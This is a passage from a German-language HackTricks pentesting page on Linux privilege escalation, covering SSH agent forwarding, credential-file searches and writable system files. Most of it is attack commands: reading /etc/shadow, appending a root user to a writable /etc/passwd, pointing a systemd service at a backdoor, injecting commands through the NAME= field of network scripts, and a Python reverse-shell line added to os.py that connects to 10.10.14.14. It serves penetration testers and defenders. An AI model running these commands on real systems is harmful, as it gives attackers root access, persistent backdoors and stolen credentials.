AuthorizedKeysFile    .ssh/authorized_keys access
```
Diese Konfiguration gibt an, dass beim Versuch, sich mit dem **privaten** Schlüssel des Benutzers "**testusername**" anzumelden, SSH den öffentlichen Schlüssel Ihres Schlüssels mit denen in `/home/testusername/.ssh/authorized_keys` und `/home/testusername/access` vergleichen wird.

### ForwardAgent/AllowAgentForwarding

SSH-Agent-Weiterleitung ermöglicht es Ihnen, **Ihre lokalen SSH-Schlüssel zu verwenden, anstatt Schlüssel** (ohne Passphrasen!) auf Ihrem Server liegen zu lassen. So können Sie über SSH **zu einem Host springen** und von dort aus **zu einem anderen** Host **springen, wobei der** Schlüssel auf Ihrem **ursprünglichen Host** verwendet wird.

Sie müssen diese Option in `$HOME/.ssh/config` wie folgt setzen:
```
Host example.com
ForwardAgent yes
```
Beachten Sie, dass wenn `Host` `*` ist, jedes Mal, wenn der Benutzer zu einer anderen Maschine wechselt, diese Maschine auf die Schlüssel zugreifen kann (was ein Sicherheitsproblem darstellt).

Die Datei `/etc/ssh_config` kann diese **Optionen** außer Kraft setzen und diese Konfiguration erlauben oder verweigern.\
Die Datei `/etc/sshd_config` kann das Weiterleiten von ssh-Agenten mit dem Schlüsselwort `AllowAgentForwarding` erlauben oder verweigern (Standard ist erlauben).

Wenn Sie feststellen, dass Agent Forward in einer Umgebung konfiguriert ist, lesen Sie die folgende Seite, da **Sie es möglicherweise missbrauchen können, um Privilegien zu eskalieren**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## Interessante Dateien

### Profildateien

Die Datei `/etc/profile` und die Dateien unter `/etc/profile.d/` sind **Skripte, die ausgeführt werden, wenn ein Benutzer eine neue Shell startet**. Daher können Sie, wenn Sie eine davon schreiben oder ändern können, Privilegien eskalieren.
```bash
ls -l /etc/profile /etc/profile.d/
```
### Passwd/Shadow-Dateien

Je nach Betriebssystem können die Dateien `/etc/passwd` und `/etc/shadow` einen anderen Namen haben oder es könnte eine Sicherungskopie geben. Daher wird empfohlen, **alle von ihnen zu finden** und zu überprüfen, ob Sie sie lesen können, um festzustellen, **ob sich Hashes** in den Dateien befinden:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In einigen Fällen können Sie **Passwort-Hashes** in der Datei `/etc/passwd` (oder einer entsprechenden Datei) finden.
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Beschreibbar /etc/passwd

Zuerst generiere ein Passwort mit einem der folgenden Befehle.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Dann fügen Sie den Benutzer `hacker` hinzu und fügen Sie das generierte Passwort hinzu.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Zum Beispiel: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sie können nun den `su` Befehl mit `hacker:hacker` verwenden.

Alternativ können Sie die folgenden Zeilen verwenden, um einen Dummy-Benutzer ohne Passwort hinzuzufügen.\
WARNUNG: Sie könnten die aktuelle Sicherheit des Systems beeinträchtigen.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
**Hinweis:** Auf BSD-Plattformen befindet sich `/etc/passwd` unter `/etc/pwd.db` und `/etc/master.passwd`, auch `/etc/shadow` wird in `/etc/spwd.db` umbenannt.

Sie sollten überprüfen, ob Sie in der Lage sind, **in einige sensible Dateien zu schreiben**. Können Sie beispielsweise in eine **Service-Konfigurationsdatei schreiben**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Zum Beispiel, wenn die Maschine einen **Tomcat**-Server ausführt und Sie die **Tomcat-Servicekonfigurationsdatei innerhalb von /etc/systemd/ ändern können**, dann können Sie die Zeilen ändern:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Dein Hintertür wird das nächste Mal ausgeführt, wenn Tomcat gestartet wird.

### Überprüfe Ordner

Die folgenden Ordner können Backups oder interessante Informationen enthalten: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Wahrscheinlich wirst du den letzten nicht lesen können, aber versuche es)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Seltsame Position/Besitzte Dateien
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Geänderte Dateien in den letzten Minuten
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite Datenbankdateien
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_Geschichte, .sudo\_als\_admin\_erfolgreich, Profil, bashrc, httpd.conf, .plan, .htpasswd, .git-Anmeldeinformationen, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml Dateien
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Versteckte Dateien
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binärdateien im PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Webdateien**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Backups**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Bekannte Dateien, die Passwörter enthalten

Lesen Sie den Code von [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), er sucht nach **mehreren möglichen Dateien, die Passwörter enthalten könnten**.\
**Ein weiteres interessantes Tool**, das Sie verwenden können, ist: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), eine Open-Source-Anwendung, die verwendet wird, um viele auf einem lokalen Computer gespeicherte Passwörter für Windows, Linux & Mac abzurufen.

### Protokolle

Wenn Sie Protokolle lesen können, können Sie **interessante/vertrauliche Informationen darin finden**. Je seltsamer das Protokoll ist, desto interessanter wird es wahrscheinlich sein.\
Außerdem können einige "**schlecht**" konfigurierte (backdoored?) **Prüfprotokolle** es Ihnen ermöglichen, **Passwörter in Prüfprotokollen aufzuzeichnen**, wie in diesem Beitrag erklärt: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Um **Logs der Gruppe** [**adm**](interessante-gruppen-linux-pe/#adm-gruppe) zu **lesen**, wird sehr hilfreich sein.

### Shell-Dateien
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generische Anmeldeinformationen-Suche/Regex

Sie sollten auch nach Dateien suchen, die das Wort "**Passwort**" im **Namen** oder im **Inhalt** enthalten, und auch nach IPs und E-Mails in Logs oder Hashes mit Regex suchen.\
Ich werde hier nicht auflisten, wie man all dies macht, aber wenn Sie interessiert sind, können Sie die letzten Überprüfungen überprüfen, die von [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) durchgeführt werden.

## Beschreibbare Dateien

### Python-Bibliotheks-Hijacking

Wenn Sie wissen, **von wo aus** ein Python-Skript ausgeführt wird und Sie in diesem Ordner schreiben **können** oder Sie **Python-Bibliotheken ändern können**, können Sie die OS-Bibliothek ändern und sie zurücktüren (wenn Sie dort schreiben können, wo das Python-Skript ausgeführt wird, kopieren und einfügen Sie die os.py-Bibliothek).

Um die Bibliothek **zurückzudrehen**, fügen Sie einfach am Ende der os.py-Bibliothek die folgende Zeile hinzu (ändern Sie IP und PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate Ausnutzung

Eine Schwachstelle in `logrotate` ermöglicht Benutzern mit **Schreibberechtigungen** auf einer Protokolldatei oder deren übergeordneten Verzeichnissen potenziell erhöhte Rechte zu erlangen. Dies liegt daran, dass `logrotate`, das oft als **root** läuft, manipuliert werden kann, um beliebige Dateien auszuführen, insbesondere in Verzeichnissen wie _**/etc/bash\_completion.d/**_. Es ist wichtig, die Berechtigungen nicht nur in _/var/log_ zu überprüfen, sondern auch in jedem Verzeichnis, in dem die Protokollrotation angewendet wird.

{% hint style="info" %}
Diese Schwachstelle betrifft `logrotate` Version `3.18.0` und älter
{% endhint %}

Weitere detaillierte Informationen zur Schwachstelle finden Sie auf dieser Seite: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Sie können diese Schwachstelle mit [**logrotten**](https://github.com/whotwagner/logrotten) ausnutzen.

Diese Schwachstelle ähnelt sehr der [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)**, daher sollten Sie immer überprüfen, wer diese Protokolle verwaltet und überprüfen, ob Sie Berechtigungen eskalieren können, indem Sie die Protokolle durch Symlinks ersetzen.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

Wenn ein Benutzer aus irgendeinem Grund in der Lage ist, ein `ifcf-<whatever>` Skript in _/etc/sysconfig/network-scripts_ **zu schreiben** oder ein vorhandenes **anzupassen**, dann ist Ihr **System kompromittiert**.

Netzwerkskripte, z. B. _ifcg-eth0_, werden für Netzwerkverbindungen verwendet. Sie sehen genau wie .INI-Dateien aus. Sie werden jedoch auf Linux von Network Manager (dispatcher.d) \~sourced\~.

In meinem Fall wird das `NAME=` Attribut in diesen Netzwerkskripten nicht korrekt behandelt. Wenn Sie **Leerzeichen im Namen haben, versucht das System, den Teil nach dem Leerzeichen auszuführen**. Dies bedeutet, dass **alles nach dem ersten Leerzeichen als root ausgeführt wird**.

Zum Beispiel: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd und rc.d**

Das Verzeichnis `/etc/init.d` beherbergt **Skripte** für System V init (SysVinit), das **klassische Linux-Service-Verwaltungssystem**. Es enthält Skripte zum `Starten`, `Stoppen`, `Neustarten` und manchmal zum `Neuladen` von Diensten. Diese können direkt ausgeführt werden oder über symbolische Links in `/etc/rc?.d/` gefunden werden. Ein alternativer Pfad in Redhat-Systemen ist `/etc/rc.d/init.d`.

Auf der anderen Seite ist `/etc/init` mit **Upstart** verbunden, einem neueren **Service-Verwaltungssystem**, das von Ubuntu eingeführt wurde und Konfigurationsdateien für Service-Verwaltungsaufgaben verwendet. Trotz des Übergangs zu Upstart werden SysVinit-Skripte aufgrund einer Kompatibilitätsschicht in Upstart weiterhin neben Upstart-Konfigurationen verwendet.

**systemd** entwickelt sich zu einem modernen Initialisierungs- und Dienst-Manager, der erweiterte Funktionen wie das Starten von Daemons auf Abruf, das Verwalten von Automounts und das Erstellen von Systemzustandssnapshots bietet. Es organisiert Dateien in `/usr/lib/systemd/` für verteilte Pakete und in `/etc/systemd/system/` für Administrator-Modifikationen, um den Systemverwaltungsprozess zu optimieren.

## Weitere Tricks

### NFS-Privileg Eskalation

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Entkommen aus eingeschränkten Shells

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Kernel-Sicherheitsschutz

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Weitere Hilfe

[Statische Impacket-Binärdateien](https://github.com/ropnop/impacket\_static\_binaries)

## Linux/Unix Privesc-Tools

### **Bestes Tool zur Suche nach Linux-Privileg-Eskalationsvektoren:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t Option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumeriert Kernel-Schwachstellen in Linux und MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physischer Zugriff):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Zusammenstellung weiterer Skripte**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referenzen

* [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\\
* [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\\
* [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\\
* [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\\
* [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\\
* [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\\
* [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\\
* [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\\
* [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
* [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
* [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
* [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
* [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
* [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
* [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
* [https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)
* [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben** oder **HackTricks im PDF-Format herunterladen** möchten, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
